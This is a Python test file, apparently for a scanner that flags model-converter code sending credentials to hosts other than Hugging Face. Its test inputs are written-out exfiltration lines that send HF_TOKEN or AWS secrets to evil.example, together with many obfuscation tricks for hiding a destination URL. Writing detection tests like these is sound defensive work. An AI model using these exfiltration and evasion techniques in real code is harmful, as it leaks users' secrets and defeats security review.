        'requests.get(HUB, headers = {"a": token})\n'
    )
    assert time.perf_counter() - started < 5

    assert [
        f.check for f in module.scan_converter_source(
            preamble
            + f'X = "{separator}".join([{elements}, "https://evil.example/c"])\n'
            'requests.get(X, headers = {"a": token})\n'
        )
    ], "an oversized join must not hide the literals inside it"

    # A NESTED spec is why the fields are parsed rather than pattern-matched:
    started = time.perf_counter()
    module.scan_converter_source(
        preamble
        + 'def dead():\n'
        + '    return "{0:{1}}".format("x", "10000000000")\n'
        'requests.get(HUB, headers = {"a": token})\n'
    )
    assert time.perf_counter() - started < 5

    # str.format has the same ceiling and needs it for a different reason: one argument referenced
    # by thousands of {0} fields expands far past the input cap.
    started = time.perf_counter()
    module.scan_converter_source(
        preamble
        + 'X = "' + "{0}" * 20_000 + '".format("' + "B" * 50_000 + '")\n'
        'requests.get(HUB, headers = {"a": token})\n'
    )
    assert time.perf_counter() - started < 5

    # The ceiling also covers the aggregate: an 8 MiB file holds thousands of bounded expansions, so
    # literals are iterated under a shared budget, not materialised into a list.
    one = '"' + "A" * 3_500 + '".join([' + ",".join(['""'] * 290) + '])\n'
    started = time.perf_counter()
    assert [
        f.check for f in module.scan_converter_source(
            preamble
            + "".join(f"x{i} = {one}" for i in range(200))
            + 'requests.get(HUB, headers = {"a": token})\n'
        )
    ]
    assert time.perf_counter() - started < 10

    # A join small enough to fold is still folded.
    assert [
        f.check for f in module.scan_converter_source(
            preamble
            + 'requests.get("".join(("htt", "ps://ev", "il.example/c")) + token)\n'
        )
    ]


def test_nothing_in_the_allowance_may_raise():
    """A scanner exception is an evasion, not an error."""
    module = _load("converter_scan_raise_probe", "unsloth_zoo/converter_scan.py")
    # An expression that need never run:
    poisoned = (
        'import os\n'
        'import requests\n'
        'HUB = "https://huggingface.co"\n'
        'def dead():\n'
        '    return "{0[x]}".format("a")\n'
        'requests.get(HUB, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
    )
    assert module._talks_only_to_the_model_hub(poisoned) is True
    assert module.scan_converter_source(poisoned) == []

    payload = (
        'import os\n'
        'import requests\n'
        'HUB = "https://huggingface.co"\n'
        'requests.get("https://evil.example/c",'
        ' data = os.environ["AWS_SECRET_ACCESS_KEY"])\n'
        'X = ' + "+".join(['"a"'] * 600) + '\n'
    )
    assert module._talks_only_to_the_model_hub(payload) is False
    assert [f.check for f in module.scan_converter_source(payload)]


def test_a_documentation_url_in_a_docstring_is_not_a_destination():
    """Comments never reach the literal walk, since it reads the AST, so upstream's Reference
    comment with a URL costs nothing."""
    scan_converter_source = _load(
        "converter_scan_docstring_probe", "unsloth_zoo/converter_scan.py",
    ).scan_converter_source

    download = (
        'import os\n'
        'import requests\n'
        'HUB = "https://huggingface.co"\n'
        'requests.get(HUB, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
    )
    assert scan_converter_source(
        '"""See https://github.com/ggml-org/llama.cpp for details."""\n' + download
    ) == []
    assert scan_converter_source(
        'import os\n'
        'import requests\n'
        'HUB = "https://huggingface.co"\n'
        'def fetch():\n'
        '    """Documented at https://github.com/ggml-org/llama.cpp."""\n'
        '    return requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"]})\n'
    ) == []

    # The word in a comment is not a read.
    assert scan_converter_source(
        '"""See https://github.com/ggml-org/llama.cpp for details."""\n'
        'import os\n'
        'import requests  # __doc__ is the module docstring\n'
        'HUB = "https://huggingface.co"\n'
        'requests.get(HUB, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
    ) == []

    # A docstring the file can read is a value like any other, as an attribute or bare name.
    assert [
        f.check for f in scan_converter_source(
            'import os\n'
            'import requests\n'
            'HUB = "https://huggingface.co"\n'
            'def fetch():\n'
            '    """https://evil.example/collect"""\n'
            'requests.get(fetch.__doc__ + os.environ["HF_TOKEN"])\n'
        )
    ]
    assert [
        f.check for f in scan_converter_source(
            '"""https://evil.example/collect"""\n'
            'import os\n'
            'import requests\n'
            'HUB = "https://huggingface.co"\n'
            'requests.get(__doc__ + os.environ["HF_TOKEN"])\n'
        )
    ]
    # getattr(fn, "__doc__") reaches the same value with neither shape.
    assert [
        f.check for f in scan_converter_source(
            'import os\n'
            'import requests\n'
            'HUB = "https://huggingface.co"\n'
            'def fetch():\n'
            '    """https://evil.example/collect"""\n'
            'requests.get(getattr(fetch, "__doc__") + os.environ["HF_TOKEN"])\n'
        )
    ]
    # Spelling lists lost; anything naming __doc__, vars or __dict__ keeps docstrings scanned.
    for reader in (
        'vars(fetch)["__doc__"]',
        'fetch.__dict__.get("__doc__", "")',
        'getattr(fetch, "__doc__")',
    ):
        assert [
            f.check for f in scan_converter_source(
                'import os\n'
                'import requests\n'
                'HUB = "https://huggingface.co"\n'
                'def fetch():\n'
                '    """https://evil.example/collect"""\n'
                f'requests.get({reader} + os.environ["HF_TOKEN"])\n'
            )
        ], reader
    # A folded name is the same name: getattr(fn, "__" + "doc__").
    assert [
        f.check for f in scan_converter_source(
            'import os\n'
            'import requests\n'
            'HUB = "https://huggingface.co"\n'
            'def fetch():\n'
            '    \"\"\"https://evil.example/collect\"\"\"\n'
            'requests.get(getattr(fetch, "__" + "doc__")'
            ' + os.environ["HF_TOKEN"])\n'
        )
    ]
    # Readers are named since a key this cannot read hides __doc__; only vars spells it out.
    assert [
        f.check for f in scan_converter_source(
            'import os\n'
            'import requests\n'
            'HUB = "https://huggingface.co"\n'
            'def fetch():\n'
            '    """https://evil.example/collect"""\n'
            'key = "__" + "doc" + "__"\n'
            'requests.get(vars(fetch)[key] + os.environ["HF_TOKEN"])\n'
        )
    ]
    # inspect.getdoc and pydoc.getdoc read it with none of those names present, so the rule is
    # introspection, not a list of __doc__ spellings.
    for reader in ('inspect.getdoc(fetch)', 'pydoc.getdoc(fetch)'):
        assert [
            f.check for f in scan_converter_source(
                'import os\n'
                'import requests\n'
                'import inspect\n'
                'import pydoc\n'
                'HUB = "https://huggingface.co"\n'
                'def fetch():\n'
                '    """https://evil.example/collect"""\n'
                f'requests.get({reader}, params = {{"t": os.environ["HF_TOKEN"]}})\n'
            )
        ], reader
    # And a bare string statement is not a docstring.
    assert [
        f.check for f in scan_converter_source(
            'import os\n'
            'import requests\n'
            'HUB = "https://huggingface.co"\n'
            'x = 1\n'
            '"https://evil.example/collect"\n'
            'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"]})\n'
        )
    ]


def test_urllib_refuses_the_hub_allowance():
    """urllib expresses a write as Request(..., data = ...), Request(..., method = "POST") or
    urlopen(..., data = ...)."""
    scan_converter_source = _load(
        "converter_scan_urllib_probe", "unsloth_zoo/converter_scan.py",
    ).scan_converter_source
    hub = 'HUB = "https://huggingface.co/api/models"\n'

    for body in (
        'urllib.request.urlopen(HUB, data = os.environ["HF_TOKEN"].encode())\n',
        'r = urllib.request.Request(\n'
        '    HUB, data = os.environ["HF_TOKEN"].encode(), method = "POST",\n'
        ')\n',
        'urllib.request.urlopen(HUB, headers = {"a": os.environ["HF_TOKEN"]})\n',
    ):
        assert [
            f.check for f in scan_converter_source(
                'import os\nimport urllib.request\n' + hub + body
            )
        ], body


def test_a_builder_or_a_docstring_reader_that_arrives_by_import_refuses_it():
    """Three spellings the readable-name checks could not see, since the name appears only on the
    import line."""
    scan_converter_source = _load(
        "converter_scan_import_alias_probe", "unsloth_zoo/converter_scan.py",
    ).scan_converter_source

    hub = 'HUB = "https://huggingface.co"\n'
    send = 'requests.get(url, params = {"t": os.environ["HF_TOKEN"]})\n'
    docstring = 'def fetch():\n    """https://evil.example/collect"""\n'
    for body in (
        'from base64 import b64decode as d\n' + hub
        + 'url = d("aHR0cHM6Ly9ldmlsLmV4YW1wbGUvYw==").decode()\n' + send,
        'import base64 as b\n' + hub
        + 'url = b.b64decode("aHR0cHM6").decode()\n' + send,
        'from binascii import unhexlify as h\n' + hub
        + 'url = h("68747470733a").decode()\n' + send,
        'import struct\n' + hub
        + 'url = struct.pack("5B", 104, 116, 116, 112, 115).decode()\n' + send,
        'from struct import pack as pk\n' + hub
        + 'url = pk("5B", 104, 116, 116, 112, 115).decode()\n' + send,
        'from urllib.parse import unquote as u\n' + hub
        + 'url = u("https%3A%2F%2Fevil.example%2Fc")\n' + send,
        'from inspect import getdoc as g\n' + hub + docstring
        + 'url = g(fetch)\n' + send,
        'from pydoc import getdoc as g\n' + hub + docstring
        + 'url = g(fetch)\n' + send,
        'import inspect as i\n' + hub + docstring
        + 'url = i.getdoc(fetch)\n' + send,
        hub + 'parts = {"s": "https", "h": "evil.example"}\n'
        + 'url = "{p[s]}://{p[h]}/c".format(p = parts)\n' + send,
        # The same hidden scheme through a spec, which is never evaluated.
        hub + 'url = "{0:s}://{1:s}/c".format(scheme, host)\n' + send,
    ):
        assert [
            f.check for f in scan_converter_source(
                'import os\nimport requests\n' + body
            )
        ], body

    # Upstream's real shape passes: no such imports, and each "://" has a readable scheme.
    assert scan_converter_source(
        'import os\nimport requests\nfrom urllib.parse import urlparse\n'
        + hub
        + 'assert urlparse(HUB).netloc\n'
        + 'url = "{}/api/models".format(HUB)\n'
        + 'requests.get(url, headers = {"a": os.environ["HF_TOKEN"]})\n'
    ) == []


def test_a_constant_rewritten_into_a_url_refuses_it():
    """A scheme that does not exist until a method call runs."""
    scan_converter_source = _load(
        "converter_scan_rewrite_probe", "unsloth_zoo/converter_scan.py",
    ).scan_converter_source

    hub = 'HUB = "https://huggingface.co"\n'
    send = 'requests.get(url, params = {"t": os.environ["HF_TOKEN"]})\n'
    for body in (
        hub + 'url = "httpsX//evil.example/c".replace("X", ":")\n' + send,
        hub + 'url = "httpsX//evil.example/c".replace(marker, colon)\n' + send,
        hub + 'url = "httpsX//evil.example/c".translate(table)\n' + send,
    ):
        assert [
            f.check for f in scan_converter_source(
                'import os\nimport requests\n' + body
            )
        ], body

    # Appending a path to the hub, in the shape a chain of appends really parses in:
    assert scan_converter_source(
        'import os\nimport requests\n' + hub
        + 'name = base.strip().replace(" ", "-").replace("/", "-")\n'
        + 'url = HUB + "/api/" + name\n' + send
    ) == []
    # And the authority is still guarded when nothing has closed it yet.
    assert [
        f.check for f in scan_converter_source(
            'import os\nimport requests\n' + hub
            + 'url = HUB + "@evil.example" + "/c"\n' + send
        )
    ]


def test_percent_formatting_is_read_whichever_way_it_is_written():
    """The % operator takes a mapping as well as a tuple, and both forms must be folded, not only
    the tuple."""
    scan_converter_source = _load(
        "converter_scan_percent_probe", "unsloth_zoo/converter_scan.py",
    ).scan_converter_source

    hub = 'HUB = "https://huggingface.co"\n'
    send = 'requests.get(url, params = {"t": os.environ["HF_TOKEN"]})\n'
    for body in (
        hub + 'url = "%(s)s://%(h)s/c" % {"s": "https", "h": "evil.example"}\n'
        + send,
        hub + 'url = "%(s)s://%(h)s/c" % parts\n' + send,
        hub + 'url = "%s://%s/c" % (scheme, host)\n' + send,
    ):
        assert [
            f.check for f in scan_converter_source(
                'import os\nimport requests\n' + body
            )
        ], body

    # A mapping template that spells the hub is read as the hub, which makes folding it worth doing
    # rather than refusing the shape; its keys must be skipped, not read as the conversion, or every
    # mapping template stays a hole and an honest one is refused.
    assert scan_converter_source(
        'import os\nimport requests\n'
        + 'url = "%(s)s://%(h)s/api" % {"s": "https", "h": "huggingface.co"}\n'
        + send
    ) == []
    # A key the mapping does not supply raises rather than folds, and erasing
    # the template there left the destination unnamed instead of unreadable.
    assert [
        f.check for f in scan_converter_source(
            'import os\nimport requests\n' + hub
            + 'url = "%(s)s://%(h)s/c" % {"s": "https"}\n' + send
        )
    ]

    # A path built the same way, appended to the hub, is what honest code does.
    assert scan_converter_source(
        'import os\nimport requests\n' + hub
        + 'url = HUB + "/api/models/%s" % name\n' + send
    ) == []


def test_a_url_assembled_out_of_named_constants_is_read_as_the_url_it_is():
    """No literal in the file is a URL at all."""
    scan_converter_source = _load(
        "converter_scan_inline_probe", "unsloth_zoo/converter_scan.py",
    ).scan_converter_source

    hub = 'HUB = "https://huggingface.co"\n'
    send = 'requests.get(url, params = {"t": os.environ["HF_TOKEN"]})\n'
    assert [
        f.check for f in scan_converter_source(
            'import os\nimport requests\n' + hub
            + 'scheme = "https"\nseparator = "://"\nhost = "evil.example"\n'
            + 'url = scheme + separator + host\n' + send
        )
    ]
    # One constant can be assigned through another, and substitution runs to a fixed point: alias =
    # scheme leaves alias unreadable until scheme has been read, one pass earlier.
    for body in (
        'scheme = "https"\nalias = scheme\n'
        'url = alias + "://evil.example/c"\n' + send,
        'a = "https"\nb = a\nc = b\nurl = c + "://evil.example/c"\n' + send,
        # A named expression binds like any assignment; dropping it hides the URL.
        'if (scheme := "https"):\n'
        '    url = scheme + "://evil.example/c"\n    ' + send,
    ):
        assert [
            f.check for f in scan_converter_source(
                'import os\nimport requests\n' + hub + body
            )
        ], body
    # And the same chain over the hub is still the hub.
    assert scan_converter_source(
        'import os\nimport requests\n'
        + 'base = "https://huggingface.co"\nalias = base\n'
        + 'url = alias + "/api"\n' + send
    ) == []

    # Assembly naming the hub reads as the hub, not a refusal for every file that builds one.
    assert scan_converter_source(
        'import os\nimport requests\n'
        + 'scheme = "https"\nseparator = "://"\nhost = "huggingface.co"\n'
        + 'url = scheme + separator + host\n' + send
    ) == []
    # A name bound more than once has no one value, so the destination stays unreadable.
    assert [
        f.check for f in scan_converter_source(
            'import os\nimport requests\n'
            + 'host = "evil.example"\n'
            + 'url = "https://" + host\n' + send
            + 'host = "huggingface.co"\n'
        )
    ]


def test_percent_formatting_is_bounded_before_it_runs():
    """The aggregate budget is spent on what the walk reads, but the % operator runs before that, so
    it must be bounded itself."""
    module = _load(
        "converter_scan_percent_bound_probe", "unsloth_zoo/converter_scan.py",
    )
    source = (
        'import os\nimport requests\n'
        'HUB = "https://huggingface.co"\n'
        'url = "' + "%(x)s" * 1_000 + '" % {"x": "' + "A" * 50_000 + '"}\n'
        'requests.get(HUB, params = {"t": os.environ["HF_TOKEN"]})\n'
    )
    assert module.scan_converter_source(source) == []

    # Tuple form has the same ceiling; with no output bound this shape got past the budget.
    tuples = (
        'import os\nimport requests\n'
        'HUB = "https://huggingface.co"\n'
        'url = "' + "%s" * 500 + '" % ('
        + ", ".join(['"' + "A" * 3_000 + '"'] * 500) + ')\n'
        'requests.get(HUB, params = {"t": os.environ["HF_TOKEN"]})\n'
    )
    assert module.scan_converter_source(tuples) == []


def test_a_url_object_that_is_rewritten_refuses_the_hub_allowance():
    """A carrier does not survive a call, on purpose: tracking what came back from
    cls.get_list_tensors(url).items() and response = requests.get(url) refused the very file this
    allowance exists for."""
    scan_converter_source = _load(
        "converter_scan_wrapper_probe", "unsloth_zoo/converter_scan.py",
    ).scan_converter_source

    preamble = (
        'import os\nimport requests\nimport httpx\nimport yarl\n'
        'from urllib.parse import urlparse\n'
        'HUB = "https://huggingface.co"\n'
    )
    token = 'headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
    for body in (
        'httpx.get(httpx.URL(HUB).copy_with(host = "evil.example"), ' + token,
        'httpx.get(yarl.URL(HUB).with_host("evil.example"), ' + token,
        'httpx.get(urlparse(HUB)._replace(netloc = "evil.example").geturl(), '
        + token,
    ):
        assert [
            f.check for f in scan_converter_source(preamble + body)
        ], body

    # Upstream's shape to stay clear of: a helper is called with the URL, and its result, which is
    # tensor metadata rather than a URL, is read with an ordinary method.
    assert scan_converter_source(
        preamble
        + 'url = f"{HUB}/api/models"\n'
        + 'for k, v in cls.get_list_tensors(url).items():\n    pass\n'
        + 'requests.get(url, ' + token
    ) == []


def test_a_url_builder_under_an_alias_or_a_result_object_refuses_it():
    """Two more spellings of the same rewrite."""
    scan_converter_source = _load(
        "converter_scan_alias_builder_probe", "unsloth_zoo/converter_scan.py",
    ).scan_converter_source

    preamble = (
        'import os\nimport requests\n'
        'from urllib.parse import urljoin as j, ParseResult\n'
        'import urllib.parse as up\n'
        'HUB = "https://huggingface.co"\n'
    )
    send = 'requests.get(u, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
    for body in (
        'u = j(HUB, "//evil.example/collect")\n' + send,
        'u = up.urljoin(HUB, "//evil.example/c")\n' + send,
        'u = ParseResult("https", "evil.example", "/c", "", "", "").geturl()\n'
        + send,
        # A client URL object takes its host as a field, so no argument of it is a URL.
        'import httpx\n'
        'u = httpx.URL(scheme = "https", host = "evil.example", path = "/c")\n'
        + send,
    ):
        assert [f.check for f in scan_converter_source(preamble + body)], body

    # Reading a parse result is what upstream does, twice; it is not building one.
    assert scan_converter_source(
        preamble + 'u = f"{HUB}/api"\nassert up.urlparse(u).netloc\n' + send
    ) == []


def test_inlining_a_constant_is_charged_per_use():
    """The budget is on what the substitution materialises, not on the name."""
    module = _load(
        "converter_scan_inline_budget_probe", "unsloth_zoo/converter_scan.py",
    )
    source = (
        'import os\nimport requests\n'
        'HUB = "https://huggingface.co"\n'
        'BIG = "' + "A" * 50_000 + '"\n'
        'url = ' + " + ".join(["BIG"] * 100) + '\n'
        'requests.get(HUB, params = {"t": os.environ["HF_TOKEN"]})\n'
    )
    # Running out refuses rather than analysing what was not read: a payload wants the rest
    # unsubstituted, a long constant ahead of three short ones spelling a host.
    assert [f.check for f in module.scan_converter_source(source)]
    # Charged per use, so the file is refused, not expanded to five megabytes from 49 KB.
    import ast as ast_module
    try:
        module._inline_constants(ast_module.parse(source))
    except module._FoldBudgetExceeded:
        pass
    else:
        raise AssertionError("the substitution was charged once per name")
    assert [
        f.check for f in module.scan_converter_source(
            'import os\nimport requests\n'
            'HUB = "https://huggingface.co"\n'
            'PAD = "' + "A" * 600_000 + '"\n'
            'pad_again = PAD\n'
            'scheme = "https"\nsep = "://"\nhost = "evil.example/collect"\n'
            'url = scheme + sep + host\n'
            'requests.get(url, params = {"t": os.environ["HF_TOKEN"]})\n'
        )
    ]

    # Appending has the same ceiling as join and formatting, since a chain of literal appends grows
    # a prefix at every level, substituted or not; two operands over the limit stay unread.
    import ast as ast_module
    oversized = ast_module.parse(
        '"' + "A" * 600_000 + '" + "' + "B" * 600_000 + '"'
    ).body[0].value
    assert module._literal_text(oversized) is None

    # A constant small enough to matter is still inlined: this one assembles a destination.
    assert [
        f.check for f in module.scan_converter_source(
            'import os\nimport requests\n'
            'HUB = "https://huggingface.co"\n'
            'host = "evil.example"\n'
            'url = "https://" + host\n'
            'requests.get(url, params = {"t": os.environ["HF_TOKEN"]})\n'
        )
    ]


def test_a_destination_spelled_in_character_codes_refuses_it():
    """bytearray([104, 116, 116, 112, 115]).decode() is a URL with no URL in it, and so is
    "".join(chr(c) for c in codes)."""
    scan_converter_source = _load(
        "converter_scan_codes_probe", "unsloth_zoo/converter_scan.py",
    ).scan_converter_source

    preamble = (
        'import os\nimport requests\nHUB = "https://huggingface.co"\n'
    )
    send = 'requests.get(url, params = {"t": os.environ["HF_TOKEN"]})\n'
    for body in (
        'url = bytearray([104, 116, 116, 112, 115]).decode()\n' + send,
        'url = bytes([104, 116, 116, 112]).decode()\n' + send,
        'url = "".join(chr(c) for c in [104, 116, 116, 112])\n' + send,
    ):
        assert [f.check for f in scan_converter_source(preamble + body)], body

    # What upstream writes: a bytearray over what came back from the hub.
    assert scan_converter_source(
        preamble
        + 'url = f"{HUB}/api"\n'
        + 'data = bytearray(get_data_by_range(url = url, start = 0))\n'
        + send
    ) == []


def test_a_sliced_constant_and_an_oversized_template_are_read_or_refused():
    """c/tcelloc/elpmaxe.live//:sptth"[::-1] is a whole URL written backwards, so nothing matched a
    scheme and the hub literal beside it granted the allowance."""
    module = _load(
        "converter_scan_slice_probe", "unsloth_zoo/converter_scan.py",
    )
    scan_converter_source = module.scan_converter_source
    preamble = 'import os\nimport requests\nHUB = "https://huggingface.co"\n'
    token = 'headers = {"x": os.environ["HF_TOKEN"]})\n'

    assert [
        f.check for f in scan_converter_source(
            preamble
            + 'requests.get("c/tcelloc/elpmaxe.live//:sptth"[::-1], ' + token
        )
    ]
    # A bound this cannot read, over text that spells no URL until sliced: folding cannot help here,
    # and not reading it is no reason to say nothing.
    assert [
        f.check for f in scan_converter_source(
            preamble
            + 'requests.get("c/tcelloc/elpmaxe.live//:sptth"[::step], ' + token
        )
    ]

    # Slicing what came back from the hub is what upstream does, and it is not a literal.
    assert scan_converter_source(
        preamble + 'url = f"{HUB}/api"\nraw = data[:8]\n'
        + 'requests.get(url, ' + token
    ) == []

    assert [
        f.check for f in scan_converter_source(
            preamble + 'url = "' + "{}" * 262_000 + '".format(a)\n'
            + 'requests.get(HUB, ' + token
        )
    ]
    # Ordinary-size templates still fold, keeping fifteen upstream .format() calls readable.
    assert scan_converter_source(
        preamble + 'url = "{}/api/models".format(HUB)\n'
        + 'requests.get(url, ' + token
    ) == []


def test_a_rebound_builder_and_a_budget_for_the_folding_itself():
    """`j = urljoin` rebinds the builder with no import in sight, so following import aliases was
    not enough: a single assignment of one name to another is followed the same way."""
    module = _load(
        "converter_scan_rebind_probe", "unsloth_zoo/converter_scan.py",
    )
    scan_converter_source = module.scan_converter_source
    assert [
        f.check for f in scan_converter_source(
            'import os\nimport requests\nfrom urllib.parse import urljoin\n'
            'HUB = "https://huggingface.co"\n'
            'j = urljoin\n'
            'url = j(HUB, "//evil.example/collect")\n'
            'requests.get(url, params = {"t": os.environ["HF_TOKEN"]})\n'
        )
    ]

    # The budget is on the folding, not a clock: every fold is charged as produced, and a decision
    # that runs out raises rather than carrying on.
    import ast as ast_module
    module._fold_state.budget = 1_000
    try:
        module._literal_text(
            ast_module.parse('"' + "A" * 2_000 + '"').body[0].value
        )
    except module._FoldBudgetExceeded:
        pass
    else:
        raise AssertionError("the fold was not charged")
    finally:
        del module._fold_state.budget

    # Joins under the ceiling, 6.4 MB in all, are refused, not folded through sixteen passes.
    one = '"' + "A" * 3_500 + '".join([' + ",".join(['""'] * 290) + '])\n'
    assert [
        f.check for f in scan_converter_source(
            'import os\nimport requests\n'
            'HUB = "https://huggingface.co"\n'
            + "".join(f"x{i} = {one}" for i in range(1_500))
            + 'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"]})\n'
        )
    ]


def test_a_join_over_pieces_this_cannot_enumerate_refuses_it():
    """"".join(x for x in ("https", "://evil.example/c")) is a whole URL, and the
    walk sees two pieces neither of which carries a scheme.
    """
    scan_converter_source = _load(
        "converter_scan_join_probe", "unsloth_zoo/converter_scan.py",
    ).scan_converter_source

    preamble = 'import os\nimport requests\nHUB = "https://huggingface.co"\n'
    send = 'requests.get(url, params = {"t": os.environ["HF_TOKEN"]})\n'
    for body in (
        'url = "".join(x for x in ("https", "://evil.example/c"))\n' + send,
        'url = "".join([x for x in ("https", "://evil.example/c")])\n' + send,
        'url = "".join(pieces)\n' + send,
        'url = "".join(map(str, ("https", "://evil.example/c")))\n' + send,
    ):
        assert [f.check for f in scan_converter_source(preamble + body)], body

    # An unreadable separator is not a hole either: it folded to one in the middle of a scheme, and
    # the join read as htt<hole>ps:// with no destination anywhere.
    for body in (
        'url = str().join(("htt", "ps://evil.example/c"))\n' + send,
        'url = sep.join(("htt", "ps://evil.example/c"))\n' + send,
    ):
        assert [f.check for f in scan_converter_source(preamble + body)], body

    # Written out, and joined on a path this file states in full: still read.
    assert scan_converter_source(
        preamble + 'url = "/".join([HUB, "api", "models"])\n' + send
    ) == []
    # os.path.join is not a separator joining pieces.
    assert scan_converter_source(
        preamble + 'import os.path\np = os.path.join(root, name)\n'
        + 'url = f"{HUB}/api"\n' + send
    ) == []


def test_a_url_repeated_into_existence_is_read_or_left_a_hole():
    """"https" * 1 + "://evil.example/c" carries its scheme in a repetition, which
    was neither folded nor refused, so no literal in the file held a URL at
    all.
    """
    module = _load(
        "converter_scan_repeat_probe", "unsloth_zoo/converter_scan.py",
    )
    scan_converter_source = module.scan_converter_source
    preamble = 'import os\nimport requests\nHUB = "https://huggingface.co"\n'
    send = 'requests.get(url, params = {"t": os.environ["HF_TOKEN"]})\n'
    for body in (
        'url = "https" * 1 + "://evil.example/c"\n' + send,
        'url = "https" * n + "://evil.example/c"\n' + send,
        'url = 1 * "https" + "://evil.example/c"\n' + send,
    ):
        assert [f.check for f in scan_converter_source(preamble + body)], body

    # A reducer applies the same plus pairwise, which no fold can follow:
    # functools.reduce(operator.add, ...) builds a URL from pieces read one at a time.
    for body in (
        'import functools, operator\n'
        'url = functools.reduce(operator.add, ["https", "://evil.example/c"])\n'
        + send,
        'import operator\nfrom functools import reduce as rd\n'
        'url = rd(operator.add, ["https", "://evil.example/c"])\n' + send,
    ):
        assert [f.check for f in scan_converter_source(preamble + body)], body

    # An unreadable count keeps the text AND a hole: returning only the hole made the walk skip
    # children holding a URL written in full.
    assert [
        f.check for f in scan_converter_source(
            preamble + 'url = "https://evil.example/c" * n\n' + send
        )
    ]

    # Repeating a separator is ordinary, and it names no destination.
    assert scan_converter_source(
        preamble + 'pad = "-" * 4\nurl = f"{HUB}/api"\n' + send
    ) == []

    import ast as ast_module
    oversized = ast_module.parse(
        '"' + "A" * 2_000 + '" * 1000'
    ).body[0].value
    assert module._literal_text(oversized) is None


def test_a_string_method_called_unbound_is_still_that_method():
    """Called unbound, the receiver is the type rather than the template, so receiver rules saw str
    and the template passed as an ordinary argument: str.format("{}://{}", "https",
    "evil.example/c") named no destination, nor did str.replace or str.join."""
    scan_converter_source = _load(
        "converter_scan_unbound_probe", "unsloth_zoo/converter_scan.py",
    ).scan_converter_source
    preamble = 'import os\nimport requests\nHUB = "https://huggingface.co"\n'
    send = 'requests.get(url, params = {"t": os.environ["HF_TOKEN"]})\n'
    for body in (
        'url = str.format("{}://{}", "https", "evil.example/c")\n' + send,
        'url = str.replace("httpsX//evil.example/c", "X", ":")\n' + send,
        'url = str.join("", ("htt", "ps://evil.example/c"))\n' + send,
    ):
        assert [f.check for f in scan_converter_source(preamble + body)], body

    # The same spelling over the hub is read as the hub, not refused.
    assert scan_converter_source(
        preamble + 'url = str.format("{}/api", HUB)\n' + send
    ) == []


def test_a_client_that_names_a_bare_host_refuses_the_hub_allowance():
    """A bare-host client like smtplib.SMTP("evil.example") refuses the hub allowance: no URL names it."""
    scan_converter_source = _load(
        "converter_scan_client_probe", "unsloth_zoo/converter_scan.py",
    ).scan_converter_source
    preamble = 'import os\nimport requests\nHUB = "https://huggingface.co"\n'
    download = 'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"]})\n'
    for body in (
        'import smtplib\n'
        'smtplib.SMTP("evil.example").sendmail("a", "b",'
        ' os.environ["HF_TOKEN"])\n',
        'import ftplib\n'
        'ftplib.FTP("evil.example").storbinary("STOR x",'
        ' os.environ["HF_TOKEN"].encode())\n',
        'from websockets import connect as c\nc("wss://evil.example")\n',
        # from http import client is http.client; a member counts with its parent package.
        'from http import client\n'
        'c = client.HTTPSConnection("evil.example")\n'
        'c.putrequest("GET", "/")\n'
        'c.putheader("a", os.environ["HF_TOKEN"])\nc.endheaders()\n',
        'from urllib import request\nrequest.urlopen("http://evil.example")\n',
        # asyncio is refused only for its connection API (open_connection to a named host);
        # writelines is not a write this rule knows.
        'import asyncio\n'
        'reader, writer = asyncio.open_connection("evil.example", 443)\n'
        'writer.writelines([os.environ["HF_TOKEN"].encode()])\n',
        'from asyncio import open_connection as oc\noc("evil.example", 443)\n',
    ):
        assert [
            f.check for f in scan_converter_source(preamble + body + download)
        ], body

    # An ordinary member of an ordinary module is not refused, and neither is asyncio itself.
    assert scan_converter_source(
        preamble + 'from os import path\n' + download
    ) == []
    assert scan_converter_source(
        preamble + 'import asyncio\nasyncio.run(main())\n' + download
    ) == []

    # The download on its own is what the allowance is for.
    assert scan_converter_source(preamble + download) == []


def test_a_dynamic_import_and_a_match_capture_are_read_as_bindings():
    """Two ways a binding happens with no line that looks like one."""
    module = _load(
        "converter_scan_dynamic_probe", "unsloth_zoo/converter_scan.py",
    )
    scan_converter_source = module.scan_converter_source
    preamble = 'import os\nimport requests\nHUB = "https://huggingface.co"\n'
    download = 'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"]})\n'
    for body in (
        '__import__("smtplib").SMTP("evil.example")'
        '.sendmail("a", "b", os.environ["HF_TOKEN"])\n',
        'import importlib\n'
        'importlib.import_module("smtplib").SMTP("evil.example")\n',
        'import importlib\nimportlib.import_module(mod).SMTP("evil.example")\n',
        '__import__("base64").b64decode("aHR0cHM6")\n',
    ):
        assert [
            f.check for f in scan_converter_source(preamble + body + download)
        ], body

    # The import call can be renamed: import_module as im, or __import__ bound to a name.
    for body in (
        'from importlib import import_module as im\n'
        'im("smtplib").SMTP("evil.example")\n',
        'import importlib\nim = importlib.import_module\n'
        'im("smtplib").SMTP("evil.example")\n',
        'imp = __import__\nimp("smtplib").SMTP("evil.example")\n',
    ):
        assert [
            f.check for f in scan_converter_source(preamble + body + download)
        ], body

    # A computed lookup leaves only a string for the importer, as the write methods did.
    for body in (
        'import builtins\n'
        'builtins.__dict__["__import__"]("smtplib").SMTP("evil.example")\n',
        'import builtins\nbuiltins.__dict__["__imp" + "ort__"]("smtplib")\n',
        'import importlib\nvars(importlib)["import_module"]("smtplib")\n',
    ):
        assert [
            f.check for f in scan_converter_source(preamble + body + download)
        ], body

    # Importing something ordinary by name is not a reason to refuse.
    assert scan_converter_source(
        preamble + 'import importlib\nimportlib.import_module("json")\n'
        + download
    ) == []

    import ast as ast_module
    if sys.version_info < (3, 10):
        return                          # no match statement to parse at all
    captured = ast_module.parse(
        'HOST = "https://huggingface.co"\n'
        'match pair:\n'
        '    case (scheme, HOST):\n'
        '        pass\n'
    )
    assert "HOST" not in module._single_assignments(captured)
    assert "HOST" in module._single_assignments(
        ast_module.parse('HOST = "https://huggingface.co"\n')
    )


def test_the_allowance_runs_where_the_match_statement_does_not_exist():
    """The package supports Python 3.9, where ast.MatchAs does not exist."""
    import ast as ast_module

    removed = {}
    for name in ("MatchAs", "MatchStar", "MatchMapping"):
